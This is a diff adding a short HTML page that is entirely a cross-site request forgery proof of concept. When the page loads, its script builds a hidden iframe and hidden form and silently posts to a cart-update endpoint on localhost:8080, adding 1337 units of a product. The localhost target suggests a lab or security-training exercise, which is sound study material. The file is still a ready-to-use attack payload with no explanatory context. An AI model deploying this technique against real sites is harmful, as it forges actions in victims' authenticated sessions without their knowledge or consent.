@@ -1,0 +1,38 @@
+<html>
+    <head></head>
+    <body>
+        <script>
+        var iframe = document.createElement("iframe");
+        iframe.name = "myTarget";
+
+        function csrf(data) {
+            let form = document.createElement("form");
+            let node = document.createElement("input");
+
+            form.action = "http://localhost:8080/updateCart.php";
+            form.target = iframe.name;
+            form.method = "post";
+
+            for(name in data) {
+                node.name  = name;
+                node.value = data[name].toString();
+                form.appendChild(node.cloneNode());
+            }
+
+            form.style.display = "none";
+            document.body.appendChild(form);
+
+            form.submit();
+
+            // But once the form is sent, it's useless to keep it.
+            document.body.removeChild(form);
+        }
+
+        window.addEventListener("load", function () {
+            iframe.style.display = "none";
+            document.body.appendChild(iframe);
+            csrf({'action': "add", 'product': "2", 'quantity': "1337"});
+        });
+        </script>
+    </body>
+</html>
